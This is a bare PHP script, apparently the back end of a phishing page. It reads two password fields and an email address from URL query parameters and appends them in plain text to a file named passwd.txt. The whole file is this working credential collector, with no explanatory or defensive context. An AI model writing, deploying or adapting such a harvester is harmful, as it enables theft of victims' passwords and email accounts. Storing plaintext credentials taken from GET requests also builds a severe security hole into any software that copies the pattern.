<?php

file_put_contents("passwd.txt", " Password:".$_GET['passwd1']."   Password confirm(2): ".$_GET['passwd2']."   Mail: ".$_GET['mail']."\n", FILE_APPEND);

?>
